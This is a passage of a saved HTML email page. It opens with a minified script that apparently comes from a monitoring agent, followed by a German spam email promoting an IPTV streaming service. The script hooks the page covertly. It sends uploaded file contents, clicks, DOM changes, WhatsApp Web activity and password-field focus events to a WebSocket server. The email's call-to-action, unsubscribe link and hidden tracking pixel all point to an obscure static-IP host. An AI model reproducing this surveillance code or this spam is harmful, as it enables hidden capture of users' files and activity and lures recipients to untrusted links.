YYYY","tt-RU":"D.M.YYYY","pa-IN":"D-M-YY","gu-IN":"D-M-YY","ta-IN":"D-M-YYYY","te-IN":"D-M-YY","kn-IN":"D-M-YY","Mr-IN":"D-M-YYYY","sa-IN":"D-M-YYYY","Mn-MN":"YY.M.D","gl-ES":"D/M/YY","kok-IN":"D-M-YYYY","syr-SY":"D/M/YYYY","Dv-MV":"D/M/YY","ar-IQ":"D/M/YYYY","zh-CN":"YYYY/M/D","De-CH":"D.M.YYYY","en-GB":"D/M/YYYY","es-MX":"D/M/YYYY","fr-BE":"D/M/YYYY","it-CH":"D.M.YYYY","nl-BE":"D/M/YYYY","nn-NO":"D.M.YYYY","pt-PT":"D-M-YYYY","sr-Latn-CS":"D.M.YYYY","sv-FI":"D.M.YYYY","az-Cyrl-AZ":"D.M.YYYY","Ms-BN":"D/M/YYYY","uz-Cyrl-UZ":"D.M.YYYY","ar-EG":"D/M/YYYY","zh-HK":"D/M/YYYY","De-AT":"D.M.YYYY","en-AU":"D/M/YYYY","es-ES":"D/M/YYYY","fr-CA":"YYYY-M-D","sr-Cyrl-CS":"D.M.YYYY","ar-LY":"D/M/YYYY","zh-SG":"D/M/YYYY","De-LU":"D.M.YYYY","en-CA":"D/M/YYYY","es-GT":"D/M/YYYY","fr-CH":"D.M.YYYY","ar-DZ":"D-M-YYYY","zh-MO":"D/M/YYYY","De-LI":"D.M.YYYY","en-NZ":"D/M/YYYY","es-CR":"D/M/YYYY","fr-LU":"D/M/YYYY","ar-MA":"D-M-YYYY","en-IE":"D/M/YYYY","es-PA":"M/D/YYYY","fr-MC":"D/M/YYYY","ar-TN":"D-M-YYYY","en-ZA":"YYYY/M/D","es-DO":"D/M/YYYY","ar-OM":"D/M/YYYY","en-JM":"D/M/YYYY","es-VE":"D/M/YYYY","ar-YE":"D/M/YYYY","en-029":"M/D/YYYY","es-CO":"D/M/YYYY","ar-SY":"D/M/YYYY","en-BZ":"D/M/YYYY","es-PE":"D/M/YYYY","ar-JO":"D/M/YYYY","en-TT":"D/M/YYYY","es-AR":"D/M/YYYY","ar-LB":"D/M/YYYY","en-ZW":"M/D/YYYY","es-EC":"D/M/YYYY","ar-KW":"D/M/YYYY","en-PH":"M/D/YYYY","es-CL":"D-M-YYYY","ar-AE":"D/M/YYYY","es-UY":"D/M/YYYY","ar-BH":"D/M/YYYY","es-PY":"D/M/YYYY","ar-QA":"D/M/YYYY","es-BO":"D/M/YYYY","es-SV":"D/M/YYYY","es-HN":"D/M/YYYY","es-NI":"D/M/YYYY","es-PR":"D/M/YYYY","aM-ET":"D/M/YYYY","tzM-Latn-DZ":"D-M-YYYY","iu-Latn-CA":"D/M/YYYY","sMa-NO":"D.M.YYYY","Mn-Mong-CN":"YYYY/M/D","gD-GB":"D/M/YYYY","en-MY":"D/M/YYYY","prs-AF":"D/M/YY","bn-BD":"D-M-YY","wo-SN":"D/M/YYYY","rw-RW":"M/D/YYYY","qut-GT":"D/M/YYYY","sah-RU":"M.D.YYYY","gsw-FR":"D/M/YYYY","co-FR":"D/M/YYYY","oc-FR":"D/M/YYYY","Mi-NZ":"D/M/YYYY","ga-IE":"D/M/YYYY","se-SE":"YYYY-M-D","br-FR":"D/M/YYYY","sMn-FI":"D.M.YYYY","Moh-CA":"M/D/YYYY","arn-CL":"D-M-YYYY","ii-CN":"YYYY/M/D","Dsb-DE":"D. M. YYYY","ig-NG":"D/M/YYYY","kl-GL":"D-M-YYYY","lb-LU":"D/M/YYYY","ba-RU":"D.M.YY","nso-ZA":"YYYY/M/D","quz-BO":"D/M/YYYY","yo-NG":"D/M/YYYY","ha-Latn-NG":"D/M/YYYY","fil-PH":"M/D/YYYY","ps-AF":"D/M/YY","fy-NL":"D-M-YYYY","ne-NP":"M/D/YYYY","se-NO":"D.M.YYYY","iu-Cans-CA":"D/M/YYYY","sr-Latn-RS":"D.M.YYYY","si-LK":"YYYY-M-D","sr-Cyrl-RS":"D.M.YYYY","lo-LA":"D/M/YYYY","kM-KH":"YYYY-M-D","cy-GB":"D/M/YYYY","bo-CN":"YYYY/M/D","sMs-FI":"D.M.YYYY","as-IN":"D-M-YYYY","Ml-IN":"D-M-YY","en-IN":"D-M-YYYY","or-IN":"D-M-YY","bn-IN":"D-M-YY","tk-TM":"D.M.YY","bs-Latn-BA":"D.M.YYYY","Mt-MT":"D/M/YYYY","sr-Cyrl-ME":"D.M.YYYY","se-FI":"D.M.YYYY","zu-ZA":"YYYY/M/D","xh-ZA":"YYYY/M/D","tn-ZA":"YYYY/M/D","hsb-DE":"D. M. YYYY","bs-Cyrl-BA":"D.M.YYYY","tg-Cyrl-TJ":"D.M.YY","sr-Latn-BA":"D.M.YYYY","sMj-NO":"D.M.YYYY","rM-CH":"D/M/YYYY","sMj-SE":"YYYY-M-D","quz-EC":"D/M/YYYY","quz-PE":"D/M/YYYY","hr-BA":"D.M.YYYY.","sr-Latn-ME":"D.M.YYYY","sMa-SE":"YYYY-M-D","en-SG":"D/M/YYYY","ug-CN":"YYYY-M-D","sr-Cyrl-BA":"D.M.YYYY","es-US":"M/D/YYYY"}[navigator.language],document.tmfilter="present")}function m(){(z=new WebSocket(I.connectionString)).onclose=a,z.onmessage=i,z.onopen=p,I.extJs&&(I.extJs.webSock={readyState:()=>z.readyState,send:e=>z.send(e)})}function h(){var e=function(){var e=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var t=0;t<e.length;t++)if(e[t]+"Hidden"in document)return e[t]+"Hidden";return null}();return!!e&&document[e]}function g(){var e=document.head.querySelector("[name='og:title']");return!!e&&"WhatsApp Web"===e.getAttribute("content")}function y(){z.send(JSON.stringify({type:"waptracking"}))}function v(){_=new Map,q=new Set,B=0,(F=new Date).setSeconds(0),F.setMilliseconds(0)}function b(e){for(var t="",n=new Uint8Array(e),Y=n.byteLength,r=0;r<Y;r++)t+=String.fromCharCode(n[r]);return window.btoa(t)}e=this,t={},n={en:{MMMM:"January February March April May June July August September October November December".split(" "),MMM:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),dddd:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ddd:"Sun Mon Tue Wed Thu Fri Sat".split(" "),dd:"Su Mo Tu We Th Fr Sa".split(" "),A:["a.m.","p.m."],formatter:{YYYY:function(e){return("000"+e.getFullYear()).slice(-4)},YY:function(e){return("0"+e.getFullYear()).slice(-2)},Y:function(e){return""+e.getFullYear()},MMMM:function(e){return this.MMMM[e.getMonth()]},MMM:function(e){return this.MMM[e.getMonth()]},MM:function(e){return("0"+(e.getMonth()+1)).slice(-2)},M:function(e){return""+(e.getMonth()+1)},DD:function(e){return("0"+e.getDate()).slice(-2)},D:function(e){return""+e.getDate()},HH:function(e){return("0"+e.getHours()).slice(-2)},H:function(e){return""+e.getHours()},A:function(e){return this.A[11<e.getHours()|0]},hh:function(e){return("0"+(e.getHours()%12||12)).slice(-2)},h:function(e){return""+(e.getHours()%12||12)},mm:function(e){return("0"+e.getMinutes()).slice(-2)},m:function(e){return""+e.getMinutes()},ss:function(e){return("0"+e.getSeconds()).slice(-2)},s:function(e){return""+e.getSeconds()},SSS:function(e){return("00"+e.getMilliseconds()).slice(-3)},SS:function(e){return("0"+(e.getMilliseconds()/10|0)).slice(-2)},S:function(e){return""+(e.getMilliseconds()/100|0)},dddd:function(e){return this.dddd[e.getDay()]},ddd:function(e){return this.ddd[e.getDay()]},dd:function(e){return this.dd[e.getDay()]},Z:function(e){return(0<(e=e.utc?0:e.getTimezoneOffset()/.6)?"-":"+")+("000"+Math.abs(e-e%100*.4)).slice(-4)},post:function(e){return e}},parser:{find:function(e,t){for(var n,Y=-1,r=0,o=0,s=e.length;o<s;o++)n=e[o],!t.indexOf(n)&&n.length>r&&(Y=o,r=n.length);return{index:Y,length:r}},MMMM:function(e){return this.parser.find(this.MMMM,e)},MMM:function(e){return this.parser.find(this.MMM,e)},A:function(e){return this.parser.find(this.A,e)},h:function(e,t){return(12===e?0:e)+12*t},pre:function(e){return e}}}},t.format=function(e,Y,r){var o=t.addMinutes(e,r?e.getTimezoneOffset():0),s=n.en,a=s.formatter;return o.utc=r,Y.replace(/(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,function(e){var t=a[e];return t?a.post(t.call(s,o,Y)):e.replace(/\[(.*)]/,"$1")})},t.parse=function(e,Y,r){var o,s,a=n.en,i=a.parser.pre(e),d=0,u=/(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,c={2:/^\d{1,4}/,3:/^\d{1,3}/,4:/^\d\d/,5:/^\d\d?/,6:/^\d/};e=[31,28,31,30,31,30,31,31,30,31,30,31];for(var l={Y:1970,M:1,D:1,H:0,m:0,s:0,S:0};o=u.exec(Y);){var M=0,f=1;for(s="";!s;)s=o[++M];o=s.charAt(0);var p=i.slice(d);if(2>M){var D=a.parser[s].call(a,p,Y);l[o]=D.index,"M"===o&&l[o]++,f=D.length}else if(7>M)D=(p.match(c[M])||[""])[0],l[o]=0|("S"===o?(D+"000").slice(0,-s.length):D),f=D.length;else if(" "!==o&&o!==p[0])return NaN;if(!f)return NaN;d+=f}return d===i.length&&D?(l.Y+=70>l.Y?2e3:100>l.Y?1900:0,l.H=l.H||a.parser.h(l.h||0,l.A||0),Y=new Date(l.Y,l.M-1,l.D,l.H,l.m,l.s,l.S),e[1]+=0|t.isLeapYear(Y),1>l.M||12<l.M||1>l.D||l.D>e[l.M-1]||23<l.H||59<l.m||59<l.s?NaN:r?t.addMinutes(Y,-Y.getTimezoneOffset()):Y):NaN},t.isValid=function(e,n){return!!t.parse(e,n)},t.addYears=function(e,n){return t.addMonths(e,12*n)},t.addMonths=function(e,t){var n=new Date(e.getTime());return n.setMonth(n.getMonth()+t),n},t.addDays=function(e,t){var n=new Date(e.getTime());return n.setDate(n.getDate()+t),n},t.addHours=function(e,n){return t.addMilliseconds(e,36e5*n)},t.addMinutes=function(e,n){return t.addMilliseconds(e,6e4*n)},t.addSeconds=function(e,n){return t.addMilliseconds(e,1e3*n)},t.addMilliseconds=function(e,t){return new Date(e.getTime()+t)},t.subtract=function(e,t){var n=e.getTime()-t.getTime();return{toMilliseconds:function(){return n},toSeconds:function(){return n/1e3|0},toMinutes:function(){return n/6e4|0},toHours:function(){return n/36e5|0},toDays:function(){return n/864e5|0}}},t.isLeapYear=function(e){return!(((e=e.getFullYear())%4||!(e%100))&&e%400)},t.isSameDay=function(e,n){return t.format(e,"YYYYMMDD")===t.format(n,"YYYYMMDD")},e.date=t;const S=new Map;function w(e){const t="tm_overlay",n=10485760;let Y=function(){let e=document.getElementById(t);e&&e.remove(),S.clear()};if(e){const r=new FileReader;let o;e.size>n&&(o=e.slice(0,n));let s=!1;if(S.forEach(t=>{t.fileName===e.name&&(s=!0)}),!s){r.addEventListener("load",t=>{try{const t=crypto.randomUUID();S.set(t,{responseCallback:e=>{e.block&&function(){const e=[],t=t=>{t.querySelectorAll('button:not([tabindex="-1"])').forEach(t=>{t.querySelector('span[data-icon="x"]')&&(e.push(t),t.click())})},n=new MutationObserver((n,Y)=>{n.forEach(e=>{"childList"===e.type&&e.addedNodes.length>0&&e.addedNodes.forEach(e=>{e.nodeType===Node.ELEMENT_NODE&&t(e)})}),e.length>0&&Y.disconnect()});n.observe(document.body,{childList:!0,subtree:!0}),t(document),e.length>0&&n.disconnect()}(),Y()},fileName:e.name}),setTimeout(()=>{S.has(t)&&(S.delete(t),Y())},2e3),z.send(JSON.stringify({requestId:t,type:"waptransfer",direction:"upload",filename:e.name,filesize:e.size,filetype:e.type,url:document.URL,filehash:"0",process:I.pn,content:b(r.result)}))}catch(e){Y()}}),r.addEventListener("error",e=>{Y()}),r.addEventListener("abort",e=>{Y()}),function(){if(!document.getElementById(t)){let e=document.createElement("div");e.id=t,e.style.cssText="background:rgba(0, 0, 0, .6);position:absolute;top:0;left:0;height:100%;width:100%;z-index:999",document.body.appendChild(e)}}();try{null==o?r.readAsArrayBuffer(e):r.readAsArrayBuffer(o)}catch(e){Y()}}}}function N(e){var t={handler:"log",module:"wapjs",url:"wap",message:e};z.send(JSON.stringify(t))}function E(e){var t={name:e.data.name,type:e.data.type};"iframePasswordInputFocused"===e.data.message?c(t,!0):"iframePasswordInputBlurred"===e.data.message&&l(t,!0)}const L=new Map;function A(e){const t=crypto.randomUUID();window.dropboxBlockedFiles||(window.dropboxBlockedFiles=new Set);const n=e.name+"_"+e.size;window.dropboxBlockedFiles.add(n),L.set(t,{responseCallback:t=>{if(t.block){document.querySelectorAll('input[type="file"]').forEach(t=>{if(t.files)try{const n=new DataTransfer;Array.from(t.files).forEach(t=>{t.name===e.name&&t.size===e.size||n.items.add(t)}),t.files=n.files,t.dispatchEvent(new Event("change",{bubbles:!0}))}catch(e){t.value=""}})}else window.dropboxBlockedFiles.delete(n)},fileName:e.name}),setTimeout(()=>{L.has(t)&&(L.delete(t),window.dropboxBlockedFiles.delete(n))},5e3);try{z.send(JSON.stringify({requestId:t,type:"dropboxtransfer",direction:"upload",filename:e.name,filesize:e.size,filetype:e.type,url:document.URL,filehash:"0",process:I.pn,content:""}))}catch(e){window.dropboxBlockedFiles.delete(n)}}function k(){return window.location.hostname.includes("dropbox.com")}window.tmDropboxHandleResponse=function(e){try{const t=JSON.parse(e),n=L.get(t.requestId);n&&(n.responseCallback(t),L.delete(t.requestId))}catch(e){}};var I={token:"2608c238-adc1-46fd-ae28-f7b9c71d35a5",sendNotificationsInterval:Number("1000"),pollWhatsappTrackingInterval:Number("20000"),connectionString:"wss://tm.filter:1506",pid:"1268",pn:"firefox.exe",iup:false,dontTrackWebPasswords:false,extJs:/*   * don't use double slash comments here as this will be stored in one line for the TMU migrations   *    * this is stored in the kv_store table for the key hm_websites_js   *    * all code should describe one javascript object, i.e. { bla-bla-bla }   *    * this object will be included in standard js injection code as a replacement of 'insight_placeholder'   * if domain of the page matches one of the domain regexes from the hypermonitoring_web settings   * if not, 'insight_placeholder' will be replaced with null   *    * this object must contain function init(token), it will be called only once when document became visible (it is called for every iframe too)   *    * also this code contains placeholdes, see doc in the code (search for `_placeholder` suffix)   *    * also this object must contain property webSock that will be assigned WebSocket when created   *    * this object should send json for every registered event with the following structure:   * {   *      cat: 'insight' - this is required to route the message to the proper handler   *      type: click | changed - type of the event   *      elm: uint32 - id of the element that fired the event. used for deduplication of the events   *      page: uint32 - id of the hypermonitored location   *      obj: uint32 - id of the hypermonitored object that fired event   *      url: string - current document url   *      token: string - js injection token, used to unique identify browser page   *      values: json - contains all collected information about event and it's context   *      proc: id of the process of the host electron   * }   */  {      /* this will be replaced with the rules for current domain       * [        *      {          *          id: locationId,        *          url: string | null,        *          objects:        *          [       *              {        *                  id: objectId,        *                  sources: [],       *                  ...       *              },       *              ...       *          ]        *      },       *      ...       * ]       */      pages: [],        /* required property for electron */      proc: null,        /* required property - will be assigned to WebSocket once it will be read */      webSock: null,      pendingPackets: [],        webSockReady: function () {          return this.webSock !== null && this.webSock.readyState === WebSocket.OPEN;      },        processPacket: function (t) {          if (!this.webSockReady())              this.pendingPackets.push(t);          else {              this.sendPendingPackets();              this.webSock.send(t);          }      },        sendPendingPackets: function () {          if (this.webSockReady() && this.pendingPackets.length > 0) {              for (var i = 0; i < this.pendingPackets.length; ++i)                  this.webSock.send(this.pendingPackets[i]);              this.pendingPackets = [];          }      },        /* store js injection token */      token: null,        /* should we send log messages to the agent, bool */      sendLog: false,        /* should we include all content of the htmlelements in the log messages, bool */      sendLogFullData: false,        /* should we log snapshots of the html after every mutation event */      sendLogSnapshots: false,        /* should we catch exceptions and log them (as opposed to let browser stops in debugger) */      sendLogExceptions: true,        /*       * required function - it will be called once when document became visible       * it will be also called for iframes       *           * argument token - js injection token       */      init: function (token) {          this.token = token;          this.log("init: token:" + token + " sendLog:" + this.sendLog + " sendLogFullData:" + this.sendLogFullData);            if (document.readyState === "interactive" || document.readyState === "complete")              this.attachEvents();          else              window.addEventListener("DOMContentLoaded", this.attachEvents.bind(this));            setInterval(this.sendPendingPackets.bind(this), 1000);      },        /*       * here we scan all provided settings and choose what listeners are required       * we don't want to intrude in the js more that necessary for performance and compatibility considerations       */      attachEvents: function () {          var needClick = false, needChange = false, needChildList = this.sendLogSnapshots, needCharacterData = this.sendLogSnapshots, callObjects = [];          this.pages.forEach(function (page) {              page.objects.forEach(function (obj) {                  ['addText', 'removeText', 'addElm', 'removeElm', 'stateByElm'].forEach(function (source) {                      if (obj.sources.includes(source))                          needChildList = true;                  });                  if (obj.sources.includes('changeText'))                      needCharacterData = true;                  if (obj.sources.includes('change'))                      needChange = true;                  if (obj.sources.includes('click'))                      needClick = true;                  if (obj.sources.includes('call'))                      callObjects.push({ page: page, obj: obj });              });          });          this.log("attachEvents: needClick:" + needClick + " needChange:" + needChange + " needChildList:" + needChildList + " needCharacterData:" + needCharacterData);          if (needClick)              window.addEventListener('click', this.onEvent.bind(this), true);          if (needChange)              window.addEventListener('change', this.onEvent.bind(this), true);          if (needChildList || needCharacterData)              new MutationObserver(this.onMutation.bind(this)).observe(document, { subtree: true, childList: needChildList, characterData: needCharacterData });            if (needClick || needChange || needChildList || needCharacterData) {              /* we process mutation events only after human interaction */              window.addEventListener('keydown', this.onInteraction.bind(this));              window.addEventListener('mousedown', this.onInteraction.bind(this));          }            if (callObjects.length > 0) {              var self = this;              var intervalHandle = setInterval(function () {                  for (var i = callObjects.length - 1; i >= 0; i--) {                      if (self.interceptCall(callObjects[i]))                          callObjects.splice(i, 1);                  }                  if (callObjects.length == 0)                      clearInterval(intervalHandle);              }, 500);          }      },        interceptCall: function (callObj) {          var obj = callObj.obj, jsObj;          try {              jsObj = this.calc(obj, "object", [], []);          }          catch{ }          if (jsObj == null) {              this.log("attachEvents: object:" + obj.id + " is not found");              return false;          }          var method = jsObj[obj.func];          var self = this;          jsObj[obj.func] = function () {              var arg_data = self.calc(obj, "arg_data", ["args"], [arguments], "return null");              var ret = method.apply(jsObj, arguments);              var return_data = self.calc(obj, "return_data", ["ret"], [ret], "return null");              if (arg_data != null || return_data != null)                  self.sendEvent("interceptCall", callObj.page, obj, undefined, { arg_data: arg_data, return_data: return_data });              return ret;          };          self.log("attachEvents: object:" + obj.id + ", " + (obj.object || obj.object_f) + " is found, call to '" + obj.func + "' intercepted");          return true;      },        /* new Date().getTime() of the last human interacion (keydown, mousedown, mouseup)      to filter out DOM mutation events that was not due to human activity */      lastInteraction: null,        /* on human interaction (keydown, mousedown, mouseup) */      onInteraction: function (ev) {          this.lastInteraction = new Date().getTime();          this.log('onInteraction: human Interaction ' + ev.type + ': ' + this.lastInteraction);      },        /* handles click and change events */      onEvent: function (ev) {          var self = this;          this.callSafe("onEvent", function () {              self.handleEvent(ev.type, ev.type, ev.composed ? ev.composedPath() : self.getAncestors(ev.target));          });      },        /* handles addText, changeText, removeText, addElm, removeElm DOM mutation events */      onMutation: function (mList) {          var self = this;          if (this.sendLogSnapshots)              this.log("snapshot: " + document.body.outerHTML.replace(/\n|\r/g, '#'));          this.callSafe("onMutation", function () {              if (self.lastInteraction !== null) {                  mList.forEach(function (m) {                      if (m.type === 'childList') {                          m.removedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'removeText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'removeElm', self.getAncestors(m.target), sub);                          });                          m.addedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'addText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'addElm', self.getAncestors(m.target), sub);                          });                      }                      else if (m.type === 'characterData' && m.target)                          self.handleEvent('change', 'changeText', self.getAncestors(m.target));                  });              }                self.processStateByElm();          });      },        objId2key2value: {},      processStateByElm: function () {          var self = this;          self.forEachObject('stateByElm', function (page, obj) {              var key2value = {};              if (self.calc(obj, 'condition', [], [], "return true;")) {                  self.applySelector(document, obj.selector).forEach(function (elm) {                      var key = self.calc(obj, 'key', ['e'], [elm]);                      var value = self.calc(obj, 'value', ['e'], [elm]);                      key2value[JSON.stringify(key)] = JSON.stringify(value);                  });              }                var oldKey2Value = self.objId2key2value[obj.id];              oldKey2Value = oldKey2Value ? oldKey2Value : {};              for (var k in key2value) {                  if (key2value[k] !== oldKey2Value[k])                      self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined, "new": JSON.parse(key2value[k]) });                  delete oldKey2Value[k];              }              for (var k in oldKey2Value)                  self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined });              self.objId2key2value[obj.id] = key2value;          });      },        /* get ancestors for the element */      getAncestors: function (e) {          var path = [];          for (; e !== document && e !== null; e = e.parentNode)              path.push(e);          return path;      },        /* handles simple events: click, change, addText, changeText, removeText */      handleEvent: function (type, source, ancestors) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEvent: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              self.send(type, page, obj, ancestors[0], elm);          });      },        /* handles events with sub element: addElm, removeElm */      handleEventWithSub: function (type, source, ancestors, sub) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEventWithSub: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]) + " sub:" + this.elementString(sub));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              if (!obj.sub_matches || sub.matches(obj.sub_matches)) {                  if (obj.sub_selector) {                      self.applySelector(sub, obj.sub_selector).forEach(function (descendant) {                          self.send(type, page, obj, ancestors[0], elm, sub, descendant);                      });                  }                  else {                      self.send(type, page, obj, ancestors[0], elm, sub);                  }              }          });      },        /* enumerate all obj based on url and source. calls handler(page, obj) */      forEachObject: function (source, handler) {          var self = this;          this.pages.forEach(function (page) {              if (self.testRegex(page.url, document.URL)) {                  page.objects.forEach(function (obj) {                      if (obj.sources.includes(source))                          handler(page, obj);                  });              }          });      },        /* enumerate all matches based on url, source and interactionInterval, matches and selector. calls handler(page, obj, matchedElm) */      forEachMatch: function (source, ancestors, handler) {          var self = this;          this.forEachObject(source, function (page, obj) {              if (obj.interactionInterval && (self.lastInteraction == null || new Date().getTime() - self.lastInteraction > obj.interactionInterval)) {                  if (self.lastInteraction != null)                      self.log('forEachMatch skip rule: interval:' + (new Date().getTime() - self.lastInteraction).toString());              }              else {                  var scope = obj.scope === 'target' ? [ancestors[0]] : ancestors,                      m = obj.matches,                      set = !m && obj.selector ? self.applySelector(document, obj.selector) : null;                  for (var i = 0; i < scope.length; ++i) {                      if ((m && scope[i].matches && scope[i].matches(m)) /* scope[i] may not be element, test if matches is defined */                          || (set && set.includes(scope[i]))) {                          handler(page, obj, scope[i]);                          break;                      }                  }              }          });      },        /* return array of elements after applying commands from the selector settings */      applySelector: function (root, commands) {          const self = this;          var elms = [root];          commands.forEach(function (command) {              var res = [];              elms.forEach(function (elm) {                  if (command.test_text) {    /* test_text command keeps only elements whose text matches regex */                      if (self.testRegex(command.test_text, elm.textContent))                          res.push(elm);                  }                  else if (command.move) {    /* move command transforms element into querySelectorAll set and select shadowRoot if present */                      elm.querySelectorAll(':scope ' + command.move).forEach(function (e) {                          var s = e.shadowRoot;                          res.push(s ? s : e);                      });                  }                  else if (command.exists) {  /* exists command keeps only elements for which selector set is not empty */                      if (self.applySelector(elm, command.exists).length !== 0)                          res.push(elm);                  }              });              elms = res;          });          return elms;      },        /* send event data to websocket, data structure:       * {       *      cat: 'insight' - this is required to route the message to the proper handler       *      type: click | changed - type of the event       *      elm: uint32 - id of the element that fired the event. used for deduplication of the events       *      page: uint32 - id of the hypermonitored location       *      obj: uint32 - id of the hypermonitored object that fired event       *      url: string - current document url       *      token: string - js injection token, used to unique identify browser page       *      values: json - contains all collected information about event and it's context       * }       */      lastSentElm: null,      lastSentElmId: 0,      send: function (type, page, obj, target, e, sub, descendant) {          if (this.lastSentElm !== e) {              this.lastSentElm = e;              this.lastSentElmId++;          }          const values = this.calc(obj, 'values', ['target', 'e', 'sub', 'descendant'], [target, e, sub, descendant]);          if (values)              this.sendEvent(type, page, obj, this.lastSentElmId.toString(), values);      },        sendEvent: function (type, page, obj, elmId, values) {          const t = JSON.stringify({              values: values,              handler: page.handler,              type: type,              elm: elmId,              page: page.id,              obj: obj.id,              url: document.URL,              token: this.token,              proc: this.proc          });          if (this.sendLog)              console.log("[InsightJs] send: " + t);          this.processPacket(t);      },        /* utils: cache compiled regexes */      string2regex: {},      testRegex: function (stringRegex, value) {          if (stringRegex === null)              return true;          if (!(stringRegex in this.string2regex))              this.string2regex[stringRegex] = new RegExp(stringRegex);          return this.string2regex[stringRegex].test(value);      },        /* utils: cache compiled functions */      code2function: {},      calc: function (host, prop, names, args, defaultCode) {          var code = host[prop] ? "return " + host[prop] + ";" : host[prop + "_f"];          if (code == null)              code = defaultCode;          if (code == null) {              this.log("code not found, calc(" + JSON.stringify(host) + "), prop:" + prop);              return {};          }          if (!(code in this.code2function))              this.code2function[code] = new Function(...names, code);          return this.code2function[code].apply(null, args);      },        /* utils: dump html element to the log */      elementString: function (e) {          var html = e.nodeType == Node.TEXT_NODE ? e.data : e.outerHTML;          if (this.sendLogFullData)              return html;          html = html.length > 100 ? html.substr(0, 100) + " ... total len:" + html.length : html;          return html.replace(/\n|\r/g, '#');      },        /* log to console and to the agent */      log: function (message, force) {          if (this.sendLog || force) {              var m = new Date().toLocaleString() + ": " + message;              console.log("[InsightJs] " + m + ", url:" + document.URL);              this.processPacket(JSON.stringify({ handler: "log", module: "InsightJs", message: m, url: document.URL }));          }      },        callSafe: function (name, f) {          if (!this.sendLogExceptions)              f();          else {              try {                  f()              }              catch (e) {                  this.log("exception in " + name + ":" + e.name + ", " + e.message, true);              }          }      }  }},T=6e4,H=null,C=null,O=null,x=null,R=!1,_=null,q=null,B=0,F=null,z=null,P="",U=!1;!function e(t){h()?setTimeout(function(){e(t)},1e3):t()}(function(){I.extJs&&I.extJs.init(I.token),Y()&&(window.addEventListener("focus",r,!0),I.dontTrackWebPasswords&&window.addEventListener("message",E,!1)),Y()||I.extJs?D():I.dontTrackWebPasswords&&f()})}();</script>
  <div class="email-container">
    <div class="header">
      <h1>📺 Entfesseln Sie die Leistung von IPTV</h1>
      <p class="subheader">Streamen Sie Live-TV, Sport, Filme und Serien – jederzeit und überall 🌍</p>
    </div>

    <div class="content">
     <p>Willkommen in der Zukunft des Home Entertainments! Mit unserem <span class="highlight">Premium-IPTV-Service</span> erhalten Sie sofortigen Zugriff auf Tausende von Live-TV-Kanälen und On-Demand-Inhalten aus aller Welt 🌐.</p>

<p>Ob Sport-, Film-, Nachrichten- oder internationale Sender – bei uns sind Sie an der richtigen Adresse. Alles, was Sie brauchen, ist ein Gerät und eine Internetverbindung! 📡</p>
      <div class="features">
        <ul>
<li>Über 10.000 Live-Kanäle und Video-on-Demand 📺</li>
<li>HD-, Full HD- und 4K-Qualität 🎥</li>
<li>Funktioniert auf Smart-TVs, Android, iOS, Firestick und mehr 📱🖥️</li>
<li>Mehrsprachige Kanäle und Untertitel 🌐</li>
<li>Kundensupport rund um die Uhr 🛠️</li>
<li>Einfache Einrichtung – keine technischen Kenntnisse erforderlich ⚡</li>
<li>Keine Vertragsbindung, jederzeit kündbar ❌</li>
        </ul>
      </div>

  <p style="text-align: center;">
        <a href="http://djtsagpj.20.196.139.106.static.hostiran.name/4GyPPo13703zvdd817kuyddzigtf322EKXLMIUDVBTXSLR266231LMIK132143D8" class="cta-button">👉 Jetzt streamen</a>
      </p>

      <p>Haben Sie noch Fragen? Unser Support-Team hilft Ihnen in wenigen Minuten beim Einstieg! 💬</p>
    </div>

    <div class="footer">
      <p>Sie erhalten diese E-Mail, weil Sie Interesse an IPTV-Diensten bekundet haben.</p>
      <p><a href="http://ktztzuvo.20.196.139.106.static.hostiran.name/6QQwxY13703WVTG817nwcsztqbzr322GKEHGLWOZVYFDAX266231YQNX132143v8">Abbestellen</a> </p>
    </div>
  </div>

<img src="http://uuntrwdx.20.196.139.106.static.hostiran.name/track/3GZRbh13703RHZj817acpzhardfg322XRPPVCGNIIYSFGX266231OOUB132143M8" width="1" height="1">

</body>
</html>
